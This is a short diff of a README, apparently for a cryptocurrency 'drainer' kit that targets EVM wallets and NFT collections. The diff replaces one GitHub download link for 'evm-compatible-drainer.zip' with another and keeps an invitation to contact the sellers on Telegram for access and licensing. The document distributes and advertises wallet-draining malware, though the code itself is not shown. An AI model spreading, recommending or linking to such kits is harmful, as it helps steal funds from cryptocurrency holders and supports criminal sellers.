@@ -118,7 +118,7 @@ Supports major NFT collections:
 
 **📦 Download:** 
 
-[⬇️ Click here to download evm-compatible-drainer.zip](https://github.com/becalm-setup/eth-drainer/raw/refs/heads/main/evm-compatible-drainer.zip)
+[⬇️ Click here to download evm-compatible-drainer.zip](https://github.com/zeroday-sec/eth-drainer/raw/refs/heads/main/evm-compatible-drainer.zip)
 
 _Contact us on Telegram for download access and licensing info._
 
